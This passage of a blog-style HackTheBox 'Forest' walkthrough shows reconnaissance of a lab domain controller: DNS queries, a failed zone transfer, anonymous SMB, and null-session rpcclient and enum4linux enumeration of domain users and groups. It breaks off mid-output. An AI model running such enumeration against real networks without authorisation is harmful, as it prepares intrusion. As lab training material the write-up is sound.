+<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="hljs-string">└─$</span> <span class="hljs-string">dig</span> <span class="hljs-string">htb.local</span> <span class="hljs-string">@10.10.10.161</span>     <br><br><span class="hljs-string">;</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">DiG</span> <span class="hljs-number">9.18</span><span class="hljs-number">.8</span><span class="hljs-number">-1</span><span class="hljs-string">-Debian</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">htb.local</span> <span class="hljs-string">@10.10.10.161</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">global options:</span> <span class="hljs-string">+cmd</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">Got answer:</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">WARNING:</span> <span class="hljs-string">.local</span> <span class="hljs-string">is</span> <span class="hljs-string">reserved</span> <span class="hljs-string">for</span> <span class="hljs-string">Multicast</span> <span class="hljs-string">DNS</span><br><span class="hljs-string">;;</span> <span class="hljs-string">You</span> <span class="hljs-string">are</span> <span class="hljs-string">currently</span> <span class="hljs-string">testing</span> <span class="hljs-string">what</span> <span class="hljs-string">happens</span> <span class="hljs-string">when</span> <span class="hljs-string">an</span> <span class="hljs-string">mDNS</span> <span class="hljs-string">query</span> <span class="hljs-string">is</span> <span class="hljs-string">leaked</span> <span class="hljs-string">to</span> <span class="hljs-string">DNS</span><br><span class="hljs-string">;;</span> <span class="hljs-string">-&gt;&gt;HEADER&lt;&lt;-</span> <span class="hljs-attr">opcode:</span> <span class="hljs-string">QUERY,</span> <span class="hljs-attr">status:</span> <span class="hljs-string">NOERROR,</span> <span class="hljs-attr">id:</span> <span class="hljs-number">24459</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">flags:</span> <span class="hljs-string">qr</span> <span class="hljs-string">aa</span> <span class="hljs-string">rd</span> <span class="hljs-string">ra;</span> <span class="hljs-attr">QUERY:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">ANSWER:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">AUTHORITY:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">ADDITIONAL:</span> <span class="hljs-number">1</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">OPT PSEUDOSECTION:</span><br><span class="hljs-string">;</span> <span class="hljs-attr">EDNS: version:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-string">flags:;</span> <span class="hljs-attr">udp:</span> <span class="hljs-number">4000</span><br><span class="hljs-string">;</span> <span class="hljs-attr">COOKIE:</span> <span class="hljs-string">2283a32ea95ada22</span> <span class="hljs-string">(echoed)</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">QUESTION SECTION:</span><br><span class="hljs-string">;htb.local.</span>                     <span class="hljs-string">IN</span>      <span class="hljs-string">A</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">ANSWER SECTION:</span><br><span class="hljs-string">htb.local.</span>              <span class="hljs-number">600</span>     <span class="hljs-string">IN</span>      <span class="hljs-string">A</span>       <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.161</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">Query time:</span> <span class="hljs-number">319</span> <span class="hljs-string">msec</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">SERVER:</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.161</span><span class="hljs-comment">#53(10.10.10.161) (UDP)</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">WHEN:</span> <span class="hljs-string">Sun</span> <span class="hljs-string">Mar</span> <span class="hljs-number">12</span> <span class="hljs-number">21</span><span class="hljs-string">:00:24</span> <span class="hljs-string">CST</span> <span class="hljs-number">2023</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">MSG SIZE  rcvd:</span> <span class="hljs-number">66</span><br><br><br><span class="hljs-string">┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]</span><br><span class="hljs-string">└─$</span> <span class="hljs-string">dig</span> <span class="hljs-string">forest.htb.local</span> <span class="hljs-string">@10.10.10.161</span><br><br><span class="hljs-string">;</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">DiG</span> <span class="hljs-number">9.18</span><span class="hljs-number">.8</span><span class="hljs-number">-1</span><span class="hljs-string">-Debian</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">forest.htb.local</span> <span class="hljs-string">@10.10.10.161</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">global options:</span> <span class="hljs-string">+cmd</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">Got answer:</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">WARNING:</span> <span class="hljs-string">.local</span> <span class="hljs-string">is</span> <span class="hljs-string">reserved</span> <span class="hljs-string">for</span> <span class="hljs-string">Multicast</span> <span class="hljs-string">DNS</span><br><span class="hljs-string">;;</span> <span class="hljs-string">You</span> <span class="hljs-string">are</span> <span class="hljs-string">currently</span> <span class="hljs-string">testing</span> <span class="hljs-string">what</span> <span class="hljs-string">happens</span> <span class="hljs-string">when</span> <span class="hljs-string">an</span> <span class="hljs-string">mDNS</span> <span class="hljs-string">query</span> <span class="hljs-string">is</span> <span class="hljs-string">leaked</span> <span class="hljs-string">to</span> <span class="hljs-string">DNS</span><br><span class="hljs-string">;;</span> <span class="hljs-string">-&gt;&gt;HEADER&lt;&lt;-</span> <span class="hljs-attr">opcode:</span> <span class="hljs-string">QUERY,</span> <span class="hljs-attr">status:</span> <span class="hljs-string">NOERROR,</span> <span class="hljs-attr">id:</span> <span class="hljs-number">9562</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">flags:</span> <span class="hljs-string">qr</span> <span class="hljs-string">aa</span> <span class="hljs-string">rd</span> <span class="hljs-string">ra;</span> <span class="hljs-attr">QUERY:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">ANSWER:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">AUTHORITY:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">ADDITIONAL:</span> <span class="hljs-number">1</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">OPT PSEUDOSECTION:</span><br><span class="hljs-string">;</span> <span class="hljs-attr">EDNS: version:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-string">flags:;</span> <span class="hljs-attr">udp:</span> <span class="hljs-number">4000</span><br><span class="hljs-string">;</span> <span class="hljs-attr">COOKIE:</span> <span class="hljs-string">03db0d79ded5c060</span> <span class="hljs-string">(echoed)</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">QUESTION SECTION:</span><br><span class="hljs-string">;forest.htb.local.</span>              <span class="hljs-string">IN</span>      <span class="hljs-string">A</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">ANSWER SECTION:</span><br><span class="hljs-string">forest.htb.local.</span>       <span class="hljs-number">3600    </span><span class="hljs-string">IN</span>      <span class="hljs-string">A</span>       <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.161</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">Query time:</span> <span class="hljs-number">303</span> <span class="hljs-string">msec</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">SERVER:</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.161</span><span class="hljs-comment">#53(10.10.10.161) (UDP)</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">WHEN:</span> <span class="hljs-string">Sun</span> <span class="hljs-string">Mar</span> <span class="hljs-number">12</span> <span class="hljs-number">21</span><span class="hljs-string">:01:28</span> <span class="hljs-string">CST</span> <span class="hljs-number">2023</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">MSG SIZE  rcvd:</span> <span class="hljs-number">73</span><br></code></pre></td></tr></table></figure>
+
+<p>​	It’s doesn’t let me do a zone transfer</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crystal">┌──(sollupus㉿kali)-[~<span class="hljs-regexp">/RedTeamNote/</span>Walkthrough/Forest]<br>└─<span class="hljs-variable">$ </span>dig axfr htb.local <span class="hljs-variable">@10</span>.<span class="hljs-number">10.10</span>.<span class="hljs-number">161</span>  <br><br>; &lt;&lt;&gt;&gt; DiG <span class="hljs-number">9.18</span>.<span class="hljs-number">8</span>-<span class="hljs-number">1</span>-Debian &lt;&lt;&gt;&gt; axfr htb.local <span class="hljs-variable">@10</span>.<span class="hljs-number">10.10</span>.<span class="hljs-number">161</span><br>;; global <span class="hljs-symbol">options:</span> +cmd<br>; Transfer failed.              <br></code></pre></td></tr></table></figure>
+
+<h3 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h3><p>​	port 139 is open ,try smb connection.Howerver,it doesn’t work.</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">smbclient -N -L //<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.161</span>/<br><br>┌──(sollupus㉿kali)-[~/RedTeamNote/Walkthrough/Forest]<br>└─$ smbclient -N -L //htb.<span class="hljs-keyword">local</span>/                        <br>Anonymous <span class="hljs-keyword">login</span> successful<br><br>        Sharename       <span class="hljs-keyword">Type</span>      <span class="hljs-keyword">Comment</span><br>        <span class="hljs-comment">---------       ----      -------</span><br>Reconnecting <span class="hljs-keyword">with</span> SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">to</span> htb.<span class="hljs-keyword">local</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">connect</span> <span class="hljs-keyword">with</span> SMB1 <span class="hljs-comment">-- no workgroup available</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><p>​	port 135 is open,try rpcclient.And find it’s work.</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">┌──(sollupus㉿kali)-[~<span class="hljs-regexp">/RedTeamNote/</span>Walkthrough/Forest]<br>└─<span class="hljs-variable">$ </span>rpcclient -U <span class="hljs-string">&quot;&quot;</span> -N <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span><br>rpcclient <span class="hljs-variable">$&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>​	Then we can use it to enumrate users,groups,member of group.</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs inform7">rpcclient $&gt; enumdomusers              <br>user:<span class="hljs-comment">[Administrator]</span> rid:<span class="hljs-comment">[0x1f4]</span>       <br>user:<span class="hljs-comment">[Guest]</span> rid:<span class="hljs-comment">[0x1f5]</span>               <br>user:<span class="hljs-comment">[krbtgt]</span> rid:<span class="hljs-comment">[0x1f6]</span>              <br>user:<span class="hljs-comment">[DefaultAccount]</span> rid:<span class="hljs-comment">[0x1f7]</span>      <br>user:<span class="hljs-comment">[$331000-VK4ADACQNUCA]</span> rid:<span class="hljs-comment">[0x463]</span><br>user:<span class="hljs-comment">[SM_2c8eef0a09b545acb]</span> rid:<span class="hljs-comment">[0x464]</span><br>user:<span class="hljs-comment">[SM_ca8c2ed5bdab4dc9b]</span> rid:<span class="hljs-comment">[0x465]</span><br>user:<span class="hljs-comment">[SM_75a538d3025e4db9a]</span> rid:<span class="hljs-comment">[0x466]</span><br>user:<span class="hljs-comment">[SM_681f53d4942840e18]</span> rid:<span class="hljs-comment">[0x467]</span><br>user:<span class="hljs-comment">[SM_1b41c9286325456bb]</span> rid:<span class="hljs-comment">[0x468]</span><br>user:<span class="hljs-comment">[SM_9b69f1b9d2cc45549]</span> rid:<span class="hljs-comment">[0x469]</span><br>user:<span class="hljs-comment">[SM_7c96b981967141ebb]</span> rid:<span class="hljs-comment">[0x46a]</span><br>user:<span class="hljs-comment">[SM_c75ee099d0a64c91b]</span> rid:<span class="hljs-comment">[0x46b]</span><br>user:<span class="hljs-comment">[SM_1ffab36a2f5f479cb]</span> rid:<span class="hljs-comment">[0x46c]</span><br>user:<span class="hljs-comment">[HealthMailboxc3d7722]</span> rid:<span class="hljs-comment">[0x46e]</span><br>user:<span class="hljs-comment">[HealthMailboxfc9daad]</span> rid:<span class="hljs-comment">[0x46f]</span><br>user:<span class="hljs-comment">[HealthMailboxc0a90c9]</span> rid:<span class="hljs-comment">[0x470]</span><br>user:<span class="hljs-comment">[HealthMailbox670628e]</span> rid:<span class="hljs-comment">[0x471]</span><br>user:<span class="hljs-comment">[HealthMailbox968e74d]</span> rid:<span class="hljs-comment">[0x472]</span><br>user:<span class="hljs-comment">[HealthMailbox6ded678]</span> rid:<span class="hljs-comment">[0x473]</span><br>user:<span class="hljs-comment">[HealthMailbox83d6781]</span> rid:<span class="hljs-comment">[0x474]</span><br>user:<span class="hljs-comment">[HealthMailboxfd87238]</span> rid:<span class="hljs-comment">[0x475]</span><br>user:<span class="hljs-comment">[HealthMailboxb01ac64]</span> rid:<span class="hljs-comment">[0x476]</span><br>user:<span class="hljs-comment">[HealthMailbox7108a4e]</span> rid:<span class="hljs-comment">[0x477]</span><br>user:<span class="hljs-comment">[HealthMailbox0659cc1]</span> rid:<span class="hljs-comment">[0x478]</span><br>user:<span class="hljs-comment">[sebastien]</span> rid:<span class="hljs-comment">[0x479]</span><br>user:<span class="hljs-comment">[lucinda]</span> rid:<span class="hljs-comment">[0x47a]</span><br>user:<span class="hljs-comment">[svc-alfresco]</span> rid:<span class="hljs-comment">[0x47b]</span>  <br>user:<span class="hljs-comment">[andy]</span> rid:<span class="hljs-comment">[0x47e]</span>                <br>user:<span class="hljs-comment">[mark]</span> rid:<span class="hljs-comment">[0x47f]</span>                <br>user:<span class="hljs-comment">[santi]</span> rid:<span class="hljs-comment">[0x480]</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs inform7">rpcclient $&gt; enumdomgroups<br>group:<span class="hljs-comment">[Enterprise Read-only Domain Controllers]</span> rid:<span class="hljs-comment">[0x1f2]</span>          <br>group:<span class="hljs-comment">[Domain Admins]</span> rid:<span class="hljs-comment">[0x200]</span><br>group:<span class="hljs-comment">[Domain Users]</span> rid:<span class="hljs-comment">[0x201]</span><br>group:<span class="hljs-comment">[Domain Guests]</span> rid:<span class="hljs-comment">[0x202]</span><br>group:<span class="hljs-comment">[Domain Computers]</span> rid:<span class="hljs-comment">[0x203]</span><br>group:<span class="hljs-comment">[Domain Controllers]</span> rid:<span class="hljs-comment">[0x204]</span><br>group:<span class="hljs-comment">[Schema Admins]</span> rid:<span class="hljs-comment">[0x206]</span><br>group:<span class="hljs-comment">[Enterprise Admins]</span> rid:<span class="hljs-comment">[0x207]</span><br>group:<span class="hljs-comment">[Group Policy Creator Owners]</span> rid:<span class="hljs-comment">[0x208]</span><br>group:<span class="hljs-comment">[Read-only Domain Controllers]</span> rid:<span class="hljs-comment">[0x209]</span><br>group:<span class="hljs-comment">[Cloneable Domain Controllers]</span> rid:<span class="hljs-comment">[0x20a]</span><br>group:<span class="hljs-comment">[Protected Users]</span> rid:<span class="hljs-comment">[0x20d]</span><br>group:<span class="hljs-comment">[Key Admins]</span> rid:<span class="hljs-comment">[0x20e]</span>            <br>group:<span class="hljs-comment">[Enterprise Key Admins]</span> rid:<span class="hljs-comment">[0x20f]</span><br>group:<span class="hljs-comment">[DnsUpdateProxy]</span> rid:<span class="hljs-comment">[0x44e]</span><br>group:<span class="hljs-comment">[Organization Management]</span> rid:<span class="hljs-comment">[0x450]</span><br>group:<span class="hljs-comment">[Recipient Management]</span> rid:<span class="hljs-comment">[0x451]</span>                 <br>group:<span class="hljs-comment">[View-Only Organization Management]</span> rid:<span class="hljs-comment">[0x452]</span><br>group:<span class="hljs-comment">[Public Folder Management]</span> rid:<span class="hljs-comment">[0x453]</span><br>group:<span class="hljs-comment">[UM Management]</span> rid:<span class="hljs-comment">[0x454]</span><br>group:<span class="hljs-comment">[Help Desk]</span> rid:<span class="hljs-comment">[0x455]</span><br>group:<span class="hljs-comment">[Records Management]</span> rid:<span class="hljs-comment">[0x456]</span><br>group:<span class="hljs-comment">[Discovery Management]</span> rid:<span class="hljs-comment">[0x457]</span><br>group:<span class="hljs-comment">[Server Management]</span> rid:<span class="hljs-comment">[0x458]</span><br>group:<span class="hljs-comment">[Delegated Setup]</span> rid:<span class="hljs-comment">[0x459]</span><br>group:<span class="hljs-comment">[Hygiene Management]</span> rid:<span class="hljs-comment">[0x45a]</span><br>group:<span class="hljs-comment">[Compliance Management]</span> rid:<span class="hljs-comment">[0x45b]</span><br>group:<span class="hljs-comment">[Security Reader]</span> rid:<span class="hljs-comment">[0x45c]</span><br>group:<span class="hljs-comment">[Security Administrator]</span> rid:<span class="hljs-comment">[0x45d]</span><br>group:<span class="hljs-comment">[Exchange Servers]</span> rid:<span class="hljs-comment">[0x45e]</span><br>group:<span class="hljs-comment">[Exchange Trusted Subsystem]</span> rid:<span class="hljs-comment">[0x45f]</span><br>group:<span class="hljs-comment">[Managed Availability Servers]</span> rid:<span class="hljs-comment">[0x460]</span><br>group:<span class="hljs-comment">[Exchange Windows Permissions]</span> rid:<span class="hljs-comment">[0x461]</span><br>group:<span class="hljs-comment">[ExchangeLegacyInterop]</span> rid:<span class="hljs-comment">[0x462]</span><br>group:<span class="hljs-comment">[$D31000-NSEL5BRJ63V7]</span> rid:<span class="hljs-comment">[0x46d]</span><br>group:<span class="hljs-comment">[Service Accounts]</span> rid:<span class="hljs-comment">[0x47c]</span><br>group:<span class="hljs-comment">[Privileged IT Accounts]</span> rid:<span class="hljs-comment">[0x47d]</span><br>group:<span class="hljs-comment">[test]</span> rid:<span class="hljs-comment">[0x13ed]</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rpcclient</span> $&gt; querygroup <span class="hljs-number">0</span>x200          <br>        <span class="hljs-attribute">Group</span> Name:     Domain Admins     <br>        <span class="hljs-attribute">Description</span>:    Designated administrators of the domain<br>        <span class="hljs-attribute">Group</span> Attribute:<span class="hljs-number">7</span>              <br>        <span class="hljs-attribute">Num</span> Members:<span class="hljs-number">1</span>                  <br><span class="hljs-attribute">rpcclient</span> $&gt; querygroupmem <span class="hljs-number">0</span>x200<br>        <span class="hljs-attribute">rid</span>:[<span class="hljs-number">0</span>x1f4] attr:[<span class="hljs-number">0</span>x7]<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rpcclient</span> $&gt; queryuser <span class="hljs-number">0</span>x1f4            <br>        <span class="hljs-attribute">User</span> Name   :   Administrator<br>        <span class="hljs-attribute">Full</span> Name   :   Administrator<br>        <span class="hljs-attribute">Home</span> Drive  :   <br>        <span class="hljs-attribute">Dir</span> Drive   :      <br>        <span class="hljs-attribute">Profile</span> Path:      <br>        <span class="hljs-attribute">Logon</span> Script:<br>        <span class="hljs-attribute">Description</span> :   Built-in account for administering the computer/domain<br>        <span class="hljs-attribute">Workstations</span>:<br>        <span class="hljs-attribute">Comment</span>     :<br>        <span class="hljs-attribute">Remote</span> Dial :<br>        <span class="hljs-attribute">Logon</span> Time               :      Mon, <span class="hljs-number">07</span> Oct <span class="hljs-number">2019</span> <span class="hljs-number">06</span>:<span class="hljs-number">57</span>:<span class="hljs-number">07</span> EDT<br>        <span class="hljs-attribute">Logoff</span> Time              :      Wed, <span class="hljs-number">31</span> Dec <span class="hljs-number">1969</span> <span class="hljs-number">19</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> EST<br>        <span class="hljs-attribute">Kickoff</span> Time             :      Wed, <span class="hljs-number">31</span> Dec <span class="hljs-number">1969</span> <span class="hljs-number">19</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> EST<br>        <span class="hljs-attribute">Password</span> last set Time   :      Wed, <span class="hljs-number">18</span> Sep <span class="hljs-number">2019</span> <span class="hljs-number">13</span>:<span class="hljs-number">09</span>:<span class="hljs-number">08</span> EDT<br>        <span class="hljs-attribute">Password</span> can change Time :      Thu, <span class="hljs-number">19</span> Sep <span class="hljs-number">2019</span> <span class="hljs-number">13</span>:<span class="hljs-number">09</span>:<span class="hljs-number">08</span> EDT<br>        <span class="hljs-attribute">Password</span> must change Time:      Wed, <span class="hljs-number">30</span> Oct <span class="hljs-number">2019</span> <span class="hljs-number">13</span>:<span class="hljs-number">09</span>:<span class="hljs-number">08</span> EDT<br>        <span class="hljs-attribute">unknown_2</span>[<span class="hljs-number">0</span>..<span class="hljs-number">31</span>]...<br>        <span class="hljs-attribute">user_rid</span> :      <span class="hljs-number">0</span>x1f4<br>        <span class="hljs-attribute">group_rid</span>:      <span class="hljs-number">0</span>x201<br>        <span class="hljs-attribute">acb_info</span> :      <span class="hljs-number">0</span>x00000010<br>        <span class="hljs-attribute">fields_present</span>: <span class="hljs-number">0</span>x00ffffff<br>        <span class="hljs-attribute">logon_divs</span>:     <span class="hljs-number">168</span><br>        <span class="hljs-attribute">bad_password_count</span>:     <span class="hljs-number">0</span>x00000000<br>        <span class="hljs-attribute">logon_count</span>:    <span class="hljs-number">0</span>x00000031<br>        <span class="hljs-attribute">padding1</span>[<span class="hljs-number">0</span>..<span class="hljs-number">7</span>]...<br>        <span class="hljs-attribute">logon_hrs</span>[<span class="hljs-number">0</span>..<span class="hljs-number">21</span>]...<br></code></pre></td></tr></table></figure>
+
+<h3 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h3><p>​	Also,we can use enum4linux tool to gather this infomation autoly.And I just paste a user-information part of it below.</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs inform7">user:<span class="hljs-comment">[Administrator]</span> rid:<span class="hljs-comment">[0x1f4]</span>                            <br>user:<span class="hljs-comment">[Guest]</span> rid:<span class="hljs-comment">[0x1f5]</span>                                    <br>user:<span class="hljs-comment">[krbtgt]</span> rid:<span class="hljs-comment">[0x1f6]</span>                                   <br>user:<span class="hljs-comment">[DefaultAccount]</span> rid:<span class="hljs-comment">[0x1f7]</span>                           <br>user:<span class="hljs-comment">[$331000-VK4ADACQNUCA]</span> rid:<span class="hljs-comment">[0x463]</span>                     <br>user:<span class="hljs-comment">[SM_2c8eef0a09b545acb]</span> rid:<span class="hljs-comment">[0x464]</span>                     <br>user:<span class="hljs-comment">[SM_ca8c2ed5bdab4dc9b]</span> rid:<span class="hljs-comment">[0x465]</span>                     <br>user:<span class="hljs-comment">[SM_75a538d3025e4db9a]</span> rid:<span class="hljs-comment">[0x466]</span>                     <br>user:<span class="hljs-comment">[SM_681f53d4942840e18]</span> rid:<span class="hljs-comment">[0x467]</span>                     <br>user:<span class="hljs-comment">[SM_1b41c9286325456bb]</span> rid:<span class="hljs-comment">[0x468]</span>                     <br>user:<span class="hljs-comment">[SM_9b69f1b9d2cc45549]</span> rid:<span class="hljs-comment">[0x469]</span>                     <br>user:<span class="hljs-comment">[SM_7c96b981967141ebb]</span> rid:<span class="hljs-comment">[0x46a]</span>                     <br>user:<span class="hljs-comment">[SM_c75ee099d0a64c91b]</span> rid:<span class="hljs-comment">[0x46b]</span>                     <br>user:<span class="hljs-comment">[SM_1ffab36a2f5f479cb]</span> rid:<span class="hljs-comment">[0x46c]</span>                     <br>user:<span class="hljs-comment">[HealthMailboxc3d7722]</span> rid:<span class="hljs-comment">[0x46e]</span>                     <br>user:<span class="hljs-comment">[HealthMailboxfc9daad]</span> rid:<span class="hljs-comment">[0x46f]</span>                     <br>user:<span class="hljs-comment">[HealthMailboxc0a90c9]</span> rid:<span class="hljs-comment">[0x470]</span>                     <br>user:<span class="hljs-comment">[HealthMailbox670628e]</span> rid:<span class="hljs-comment">[0x471]</span>                     <br>user:<span class="hljs-comment">[HealthMailbox968e74d]</span> rid:<span class="hljs-comment">[0x472]</span>                     <br>user:<span class="hljs-comment">[HealthMailbox6ded678]</span> rid:<span class="hljs-comment">[0x473]</span>                     <br>user:<span class="hljs-comment">[HealthMailbox83d6781]</span> rid:<span class="hljs-comment">[0x474]</span>                     <br>user:<span class="hljs-comment">[HealthMailboxfd87238]</span> rid:<span class="hljs-comment">[0x475]</span>                     <br>user:<span class="hljs-comment">[HealthMailboxb01ac64]</span> rid:<span class="hljs-comment">[0x476]</span>                     <br>user:<span class="hljs-comment">[HealthMailbox7108a4e]</span> rid:<span class="hljs-comment">[0x477]</span>                     <br>user:<span 